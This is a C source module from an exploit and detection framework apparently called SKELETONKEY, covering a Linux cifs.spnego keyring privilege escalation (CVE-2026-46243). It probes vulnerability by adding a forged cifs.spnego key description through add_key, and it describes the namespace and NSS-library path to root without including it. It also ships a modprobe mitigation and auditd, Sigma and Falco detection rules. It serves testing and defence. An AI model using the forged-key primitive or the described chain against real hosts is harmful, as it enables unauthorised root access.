/*
 * cifswitch_cve_2026_46243 — SKELETONKEY module
 *
 * CVE-2026-46243 "CIFSwitch" — the kernel's `cifs.spnego` request-key
 * type accepts key descriptions created by *userspace* (via add_key(2) /
 * request_key(2)) without verifying the request originated from the
 * in-kernel CIFS client. Those descriptions carry authority-bearing
 * fields (`pid`, `uid`, `creduid`, `upcall_target`) that the
 * root-privileged `cifs.upcall` helper trusts as kernel-originating.
 * An unprivileged user forges a description and — combined with user +
 * mount namespace manipulation — coerces `cifs.upcall` into loading an
 * attacker-controlled NSS shared library as root → local root.
 *
 * Disclosed by Asim Manizada, 2026-05-28 (public PoC same day). A
 * ~19-year-old bug: the cifs spnego upcall predates the key-type origin
 * checks added later. Fixed upstream by commit 3da1fdf4efbc (merged
 * 7.1-rc5): "smb: client: reject userspace cifs.spnego descriptions".
 * NVD: CWE-20 (Improper Input Validation). Not in CISA KEV.
 *
 * STATUS: 🟡 PRIMITIVE / ported-from-disclosure, NOT yet VM-verified.
 *   Structural logic flaw — no offsets, no race, no shellcode. detect()
 *   gates on (a) the kernel version (Debian-tracked backports below) and
 *   (b) the presence of the vulnerable userspace path: the `cifs.upcall`
 *   helper / `cifs.spnego` request-key rule. A vulnerable kernel without
 *   cifs-utils is not reachable via this technique, so that case is
 *   PRECOND_FAIL, not VULNERABLE. exploit() fires the reachable,
 *   non-destructive part of the primitive — it attempts to register a
 *   forged-but-benign `cifs.spnego` key as the unprivileged user (via
 *   add_key(2), which does NOT invoke cifs.upcall) and observes whether
 *   the kernel accepts a userspace-originated description — then STOPS.
 *   The namespace-switch + malicious-NSS-load that turns that into a
 *   root shell is target/config-specific and is not bundled until it can
 *   be VM-verified end-to-end. Honest EXPLOIT_FAIL without a euid-0
 *   witness; never fabricates root.
 *
 * Affected range (Debian-tracked stable backports of the fix):
 *   5.10.x : K >= 5.10.257  (bullseye)
 *   6.1.x  : K >= 6.1.174   (bookworm)
 *   6.12.x : K >= 6.12.90   (trixie)
 *   7.0.x  : K >= 7.0.10    (forky / sid); mainline fixed 7.1-rc5
 *   Branches Debian doesn't track (5.15 / 6.6 / 6.8 / 6.11 ...) fall
 *   through to the version-only verdict — confirm empirically.
 *
 * Preconditions: cifs kernel module available + cifs-utils installed
 *   (`cifs.upcall` present) + the `cifs.spnego` request-key rule active.
 *   Override the precondition probe with SKELETONKEY_CIFS_ASSUME_PRESENT
 *   = 1 (force present) / 0 (force absent) when you know the fleet's CIFS
 *   posture better than a local file probe can (also drives unit tests).
 *
 * arch_support: any. Keyring + namespace logic; no shellcode.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

/* _GNU_SOURCE is passed via -D in the top-level Makefile; do not
 * redefine here (warning: redefined). */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>

/* keyring syscalls live in libkeyutils, not glibc — call them directly.
 * The asm-generic numbers below match x86_64 / arm64 / most arches; fall
 * back only when the toolchain headers don't already define them. */
#ifndef SYS_add_key
#define SYS_add_key 248
#endif
#ifndef SYS_keyctl
#define SYS_keyctl 250
#endif

/* keyctl operations + special keyring ids (uapi/linux/keyctl.h). */
#ifndef KEYCTL_REVOKE
#define KEYCTL_REVOKE 3
#endif
#ifndef KEY_SPEC_PROCESS_KEYRING
#define KEY_SPEC_PROCESS_KEYRING (-2)
#endif

typedef int sk_key_serial_t;

static sk_key_serial_t sk_add_key(const char *type, const char *desc,
                                  const void *payload, size_t plen,
                                  sk_key_serial_t keyring)
{
    return (sk_key_serial_t)syscall(SYS_add_key, type, desc,
                                    payload, plen, keyring);
}
static long sk_keyctl_revoke(sk_key_serial_t key)
{
    return syscall(SYS_keyctl, (long)KEYCTL_REVOKE, (long)key, 0L, 0L, 0L);
}

/* Debian-tracked stable backports of the 2026 fix (commit 3da1fdf4efbc,
 * mainline 7.1-rc5). These are the authoritative thresholds
 * (security-tracker.debian.org). Branches Debian doesn't ship fall
 * through to the version-only verdict in detect(). */
static const struct kernel_patched_from cifswitch_patched_branches[] = {
    {5, 10, 257},  /* 5.10-LTS backport (Debian bullseye) */
    {6,  1, 174},  /* 6.1-LTS  backport (Debian bookworm) */
    {6, 12,  90},  /* 6.12-LTS backport (Debian trixie) */
    {7,  0,  10},  /* 7.0 stable        (Debian forky / sid) */
};

static const struct kernel_range cifswitch_range = {
    .patched_from = cifswitch_patched_branches,
    .n_patched_from = sizeof(cifswitch_patched_branches) /
                      sizeof(cifswitch_patched_branches[0]),
};

/* Is the vulnerable userspace path present? The load-bearing signal is
 * the cifs.upcall helper (the privileged component the bug abuses); the
 * cifs.spnego request-key rule and a loaded/loadable cifs module
 * corroborate. SKELETONKEY_CIFS_ASSUME_PRESENT overrides the probe:
 * "1" = present, "0" = absent (operators who know their fleet's CIFS
 * posture, and the unit tests, use this). */
static bool cifs_userspace_present(void)
{
    const char *force = getenv("SKELETONKEY_CIFS_ASSUME_PRESENT");
    if (force && (force[0] == '1' || force[0] == '0'))
        return force[0] == '1';

    struct stat st;
    static const char *upcall_paths[] = {
        "/usr/sbin/cifs.upcall", "/sbin/cifs.upcall",
        "/usr/bin/cifs.upcall", "/usr/local/sbin/cifs.upcall", NULL,
    };
    for (size_t i = 0; upcall_paths[i]; i++)
        if (stat(upcall_paths[i], &st) == 0)
            return true;

    /* request-key rule for cifs.spnego (cifs-utils ships this). */
    static const char *reqkey_paths[] = {
        "/etc/request-key.d/cifs.spnego.conf",
        "/usr/share/request-key.d/cifs.spnego.conf", NULL,
    };
    for (size_t i = 0; reqkey_paths[i]; i++)
        if (stat(reqkey_paths[i], &st) == 0)
            return true;

    return false;
}

static skeletonkey_result_t cifswitch_detect(const struct skeletonkey_ctx *ctx)
{
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] cifswitch: host fingerprint missing kernel "
                    "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* A patched kernel is not vulnerable regardless of the userspace
     * path — decide that first so the verdict is deterministic. */
    if (kernel_range_is_patched(&cifswitch_range, v)) {
        if (!ctx->json)
            fprintf(stderr, "[+] cifswitch: kernel %s is patched "
                            "(version-only check)\n", v->release);
        return SKELETONKEY_OK;
    }

    /* Vulnerable kernel. Exploitation needs the cifs.upcall userspace
     * path; without it the technique is unreachable here. */
    if (!cifs_userspace_present()) {
        if (!ctx->json) {
            fprintf(stderr, "[i] cifswitch: kernel %s is in the vulnerable "
                            "range but cifs.upcall / cifs.spnego request-key "
                            "rule not found — cifs-utils not installed, bug "
                            "not reachable here\n", v->release);
            fprintf(stderr, "[i] cifswitch: if you know this fleet uses CIFS, "
                            "re-run with SKELETONKEY_CIFS_ASSUME_PRESENT=1\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] cifswitch: kernel %s VULNERABLE and cifs.upcall "
                        "present — CVE-2026-46243 reachable\n", v->release);
        fprintf(stderr, "[i] cifswitch: userspace can forge cifs.spnego key "
                        "descriptions (pid/uid/creduid/upcall_target) the root "
                        "cifs.upcall helper trusts\n");
        fprintf(stderr, "[i] cifswitch: branches Debian doesn't track "
                        "(5.15/6.6/6.8/6.11) are version-only here; confirm with "
                        "`--exploit cifswitch --i-know`\n");
    }
    return SKELETONKEY_VULNERABLE;
}

static skeletonkey_result_t cifswitch_exploit(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr, "[-] cifswitch: --i-know required for --exploit\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    skeletonkey_result_t pre = cifswitch_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] cifswitch: detect() says not vulnerable/reachable; "
                        "refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] cifswitch: already running as root — nothing to do\n");
        return SKELETONKEY_OK;
    }

    /* Reachable, non-destructive primitive witness: can we, as an
     * unprivileged user, register a cifs.spnego key carrying the
     * authority-bearing fields? add_key(2) instantiates the key directly
     * — it does NOT invoke cifs.upcall (that is request_key's upcall
     * path), so this loads nothing and triggers no privileged helper. On
     * a VULNERABLE kernel the type accepts the userspace-originated
     * description; the fix (3da1fdf4efbc) rejects it. We revoke any key
     * we create immediately. A clean accept is the empirical signal that
     * the missing-origin-validation flaw is present; any error is treated
     * as inconclusive (could be patched, or add_key unsupported for the
     * type) and reported honestly — we never infer root from it. */
    const char *desc =
        "ver=0x2;host=skeletonkey-probe;ip4=127.0.0.1;sec=krb5;"
        "uid=0x0;creduid=0x0;user=skprobe;pid=0x0";
    errno = 0;
    sk_key_serial_t k = sk_add_key("cifs.spnego", desc, "\x00", 1,
                                   KEY_SPEC_PROCESS_KEYRING);
    if (k > 0) {
        sk_keyctl_revoke(k);   /* don't leave the probe key lying around */
        fprintf(stderr,
            "[!] cifswitch: primitive CONFIRMED — kernel accepted a "
            "userspace-forged cifs.spnego key (serial %d) carrying "
            "uid/creduid/upcall_target. CVE-2026-46243 reachable.\n", k);
        fprintf(stderr,
            "[i] cifswitch: the full root-pop (user+mount namespace switch "
            "coercing cifs.upcall to load an attacker NSS module as root) is "
            "target/config-specific and NOT bundled until VM-verified. Not "
            "fabricating a shell. See module NOTICE.md (Asim Manizada PoC).\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (errno == ENOSYS) {
        fprintf(stderr, "[-] cifswitch: add_key(2) ENOSYS — keyrings "
                        "unavailable in this kernel build\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    fprintf(stderr,
        "[-] cifswitch: kernel did not accept a userspace-forged cifs.spnego "
        "key (add_key: %s). Inconclusive — the kernel may carry the fix "
        "(3da1fdf4efbc rejects userspace descriptions), or the key type may "
        "not permit direct add_key here. detect() reported the version+helper "
        "as vulnerable; verify against a known-vulnerable VM.\n",
        strerror(errno));
    return SKELETONKEY_EXPLOIT_FAIL;
}

/* Mitigation: the vendor-recommended runtime fix is to blocklist the
 * cifs module so the vulnerable upcall path cannot be reached. We write
 * a modprobe.d blocklist (needs root; persists across reboot and blocks
 * future autoload). We do not force-unload a possibly-mounted cifs. The
 * real fix is the kernel patch. --cleanup removes the blocklist file. */
#define CIFSWITCH_BLOCKLIST "/etc/modprobe.d/skeletonkey-disable-cifs.conf"

static skeletonkey_result_t cifswitch_mitigate(const struct skeletonkey_ctx *ctx)
{
    int fd = open(CIFSWITCH_BLOCKLIST, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        fprintf(stderr, "[-] cifswitch: cannot write %s: %s "
                        "(need root: run as root, or "
                        "`echo 'blacklist cifs' | sudo tee %s`)\n",
                CIFSWITCH_BLOCKLIST, strerror(errno), CIFSWITCH_BLOCKLIST);
        return SKELETONKEY_PRECOND_FAIL;
    }
    static const char body[] =
        "# Added by SKELETONKEY --mitigate cifswitch (CVE-2026-46243).\n"
        "# Blocklists the cifs module so the vulnerable cifs.spnego upcall\n"
        "# path cannot be reached. Remove via `--cleanup cifswitch`.\n"
        "blacklist cifs\n"
        "install cifs /bin/false\n";
    ssize_t w = write(fd, body, sizeof body - 1);
    close(fd);
    if (w != (ssize_t)(sizeof body - 1)) {
        fprintf(stderr, "[-] cifswitch: short write to %s\n", CIFSWITCH_BLOCKLIST);
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    fprintf(stderr, "[+] cifswitch: wrote %s (blocklist cifs). Already-loaded "
                    "cifs stays until unmounted+`rmmod cifs` or reboot. This is "
                    "a stopgap; patch the kernel. Revert: `--cleanup cifswitch`.\n",
            CIFSWITCH_BLOCKLIST);
    (void)ctx;
    return SKELETONKEY_OK;
}

static skeletonkey_result_t cifswitch_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (unlink(CIFSWITCH_BLOCKLIST) == 0) {
        if (!ctx->json)
            fprintf(stderr, "[*] cifswitch: removed %s\n", CIFSWITCH_BLOCKLIST);
    } else if (errno != ENOENT) {
        fprintf(stderr, "[-] cifswitch: could not remove %s: %s\n",
                CIFSWITCH_BLOCKLIST, strerror(errno));
    }
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: keyrings, cifs.upcall and modprobe are all
 * Linux-only. Stub so the module still registers and `make` completes on
 * macOS/BSD dev boxes. */
static skeletonkey_result_t cifswitch_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] cifswitch: Linux-only module "
                "(cifs.spnego keyring trust) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t cifswitch_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] cifswitch: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t cifswitch_mitigate(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t cifswitch_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

/* Embedded detection rules — keep the binary self-contained. The
 * behavioural signal is a non-root process creating a `cifs.spnego` key
 * (add_key/request_key) and/or an unexpected cifs.upcall execution
 * paired with user-namespace setup. */
static const char cifswitch_auditd[] =
    "# CVE-2026-46243 (CIFSwitch) — auditd detection rules\n"
    "# A non-root add_key/request_key for cifs.spnego is the core abuse,\n"
    "# usually paired with unshare(CLONE_NEWUSER|CLONE_NEWNS) and a\n"
    "# cifs.upcall execution that loads an attacker NSS module.\n"
    "-a always,exit -F arch=b64 -S add_key     -F auid>=1000 -F auid!=4294967295 -k skeletonkey-cifswitch\n"
    "-a always,exit -F arch=b64 -S request_key -F auid>=1000 -F auid!=4294967295 -k skeletonkey-cifswitch\n"
    "-a always,exit -F arch=b64 -S unshare     -F auid>=1000 -F auid!=4294967295 -k skeletonkey-cifswitch\n"
    "-w /usr/sbin/cifs.upcall -p x -k skeletonkey-cifswitch\n";

static const char cifswitch_sigma[] =
    "title: Possible CVE-2026-46243 CIFSwitch cifs.spnego keyring LPE\n"
    "id: 9b2e7c10-skeletonkey-cifswitch\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects a non-root process creating a cifs.spnego key via\n"
    "  add_key/request_key. CIFSwitch forges the authority-bearing fields\n"
    "  (uid/creduid/upcall_target) in a cifs.spnego key description that\n"
    "  the root cifs.upcall helper trusts, then uses namespace tricks to\n"
    "  load an attacker NSS module as root. False positives: legitimate\n"
    "  CIFS/Kerberos mounts normally trigger cifs.spnego from kernel\n"
    "  context (root), not from an unprivileged add_key.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  keyop:    {type: 'SYSCALL', syscall: ['add_key', 'request_key']}\n"
    "  non_root: {auid|expression: '>= 1000'}\n"
    "  condition: keyop and non_root\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2026.46243]\n";

static const char cifswitch_falco[] =
    "- rule: non-root cifs.spnego key creation (CVE-2026-46243 CIFSwitch)\n"
    "  desc: |\n"
    "    A non-root process creates a cifs.spnego key (add_key/request_key)\n"
    "    or spawns cifs.upcall outside a kernel-initiated CIFS mount. The\n"
    "    CIFSwitch LPE forges authority fields in the key description that\n"
    "    the root cifs.upcall helper trusts, loading an attacker NSS module\n"
    "    as root. False positives: container/CIFS tooling run as root.\n"
    "  condition: >\n"
    "    ((evt.type in (add_key, request_key)) or\n"
    "     (spawned_process and proc.name = cifs.upcall)) and not user.uid = 0\n"
    "  output: >\n"
    "    non-root cifs.spnego key op / cifs.upcall (possible CVE-2026-46243)\n"
    "    (user=%user.name proc=%proc.name pid=%proc.pid cmdline=\"%proc.cmdline\")\n"
    "  priority: HIGH\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2026.46243]\n";

const struct skeletonkey_module cifswitch_module = {
    .name           = "cifswitch",
    .cve            = "CVE-2026-46243",
    .summary        = "cifs.spnego key type trusts userspace-forged authority fields → cifs.upcall loads attacker NSS module as root (Asim Manizada)",
    .family         = "cifswitch",
    .kernel_range   = "fixed 5.10.257 / 6.1.174 / 6.12.90 / 7.0.10 (Debian backports of commit 3da1fdf4efbc, mainline 7.1-rc5); ~19-year-old bug below those",
    .detect         = cifswitch_detect,
    .exploit        = cifswitch_exploit,
    .mitigate       = cifswitch_mitigate,
    .cleanup        = cifswitch_cleanup,
    .detect_auditd  = cifswitch_auditd,
    .detect_sigma   = cifswitch_sigma,
    .detect_yara    = NULL,   /* attacker NSS .so has no stable signature; behavioural bug */
    .detect_falco   = cifswitch_falco,
    .opsec_notes    = "detect() consults the shared host fingerprint for the kernel version (Debian backports 5.10.257/6.1.174/6.12.90/7.0.10) and probes for the cifs.upcall helper / cifs.spnego request-key rule (override via SKELETONKEY_CIFS_ASSUME_PRESENT=1/0); a vulnerable kernel without cifs-utils is PRECOND_FAIL. exploit() fires only the non-destructive primitive: add_key(2) of a forged-but-benign cifs.spnego key (does NOT invoke cifs.upcall, loads nothing), revokes it immediately, and treats a clean accept as the empirical witness — it never runs the namespace-switch + malicious-NSS-load chain that pops root, and returns EXPLOIT_FAIL without a euid-0 witness. Audit-visible via add_key/request_key for cifs.spnego by a non-root auid, typically alongside unshare(CLONE_NEWUSER|CLONE_NEWNS) and a cifs.upcall execution. --mitigate writes /etc/modprobe.d/skeletonkey-disable-cifs.conf (blacklist cifs); --cleanup removes it. Arch-agnostic (no shellcode).",
    .arch_support   = "any",
};

void skeletonkey_register_cifswitch(void)
{
    skeletonkey_register(&cifswitch_module);
}
